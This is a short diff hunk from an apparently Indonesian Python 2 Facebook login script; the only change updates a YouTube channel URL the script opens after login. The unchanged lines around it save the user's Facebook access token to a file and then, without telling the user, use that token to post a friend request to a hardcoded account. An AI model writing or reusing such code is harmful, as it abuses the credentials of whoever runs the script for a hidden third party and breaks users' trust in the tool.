@@ -139,7 +139,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
-				os.system('xdg-open https://m.youtube.com/channel/UCX7EshsC')
+				os.system('xdg-open https://m.youtube.com/channel/UCX7EshsCMM_qR0FTlIMis1g')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
